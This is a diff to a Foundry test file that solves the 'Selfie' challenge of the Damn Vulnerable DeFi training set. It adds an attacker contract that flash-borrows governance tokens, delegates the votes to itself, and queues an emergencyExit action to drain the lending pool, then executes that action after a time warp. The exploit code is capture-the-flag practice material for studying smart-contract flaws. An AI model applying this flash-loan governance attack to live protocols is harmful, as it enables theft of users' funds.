@@ -6,6 +6,51 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
+
+contract SelfieAttacker is IERC3156FlashBorrower {
+    SelfiePool pool;
+    DamnValuableVotes token;
+    SimpleGovernance governance;
+    address recovery;
+    uint256 public actionId;
+
+    bytes32 private constant CALLBACK_SUCCESS =
+        keccak256("ERC3156FlashBorrower.onFlashLoan");
+
+    constructor(
+        SelfiePool _pool,
+        DamnValuableVotes _token,
+        SimpleGovernance _governance,
+        address _recovery
+    ) {
+        pool = _pool;
+        token = _token;
+        governance = _governance;
+        recovery = _recovery;
+    }
+
+    function onFlashLoan(
+        address,
+        address,
+        uint256 amount,
+        uint256,
+        bytes calldata
+    ) external returns (bytes32) {
+        token.delegate(address(this));
+
+        actionId = governance.queueAction(
+            address(pool),
+            0,
+            abi.encodeCall(SelfiePool.emergencyExit, (recovery))
+        );
+
+        token.approve(address(pool), amount);
+
+        return CALLBACK_SUCCESS;
+    }
+}
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +107,16 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        uint256 amount = pool.maxFlashLoan(address(token));
+
+        SelfieAttacker attacker =
+            new SelfieAttacker(pool, token, governance, recovery);
+
+        pool.flashLoan(attacker, address(token), amount, "");
+
+        vm.warp(block.timestamp + 2 days + 1);
+
+        governance.executeAction(attacker.actionId());
     }
 
     /**
